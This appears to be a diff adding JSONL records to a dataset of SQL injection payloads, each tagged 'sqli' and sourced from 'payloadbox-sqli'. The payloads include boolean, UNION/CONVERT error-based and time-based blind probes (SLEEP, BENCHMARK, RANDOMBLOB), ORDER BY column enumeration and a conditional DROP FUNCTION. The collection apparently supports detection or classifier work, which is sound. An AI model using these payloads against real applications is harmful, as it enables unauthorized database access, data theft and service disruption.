+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 7300=7300 AND 'pKlZ'='pKlY", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 7300=7300 AND 'pKlZ'='pKlZ", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 7300=7300 AND ('pKlZ'='pKlY", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 7300=7300 AND ('pKlZ'='pKlZ", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 7506=9091 AND ('5913=5913", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AND 7506=9091 AND (5913=5913", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AS INJECTX WHERE 1=1 AND 1=0", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AS INJECTX WHERE 1=1 AND 1=0#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AS INJECTX WHERE 1=1 AND 1=0--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AS INJECTX WHERE 1=1 AND 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AS INJECTX WHERE 1=1 AND 1=1#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AS INJECTX WHERE 1=1 AND 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AnD SLEEP(5)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AnD SLEEP(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "AnD SLEEP(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "HAVING 1=0", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "HAVING 1=0#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "HAVING 1=0--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "HAVING 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "HAVING 1=1#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "HAVING 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR 1=0", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR 1=0#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR 1=0--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR 1=1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR 1=1#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR 1=1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR 3409=3409 AND ('pytW' LIKE 'pytW", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR 3409=3409 AND ('pytW' LIKE 'pytY", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR x=x", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR x=x#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR x=x--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR x=y", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR x=y#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "OR x=y--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5)", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5)#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),3#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),3,4#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),3,4--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),3--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1,SLEEP(5)--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 1--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 10", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 10#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 10--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 11", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 11#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 11--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 12", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 12#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 12--", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 13", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 13#", "attack_type": "sqli", "source": "payloadbox-sqli"}
+{"payload": "ORDER BY 13--", "attack_type": "sqli", "source": "payloadbox-sqli"}
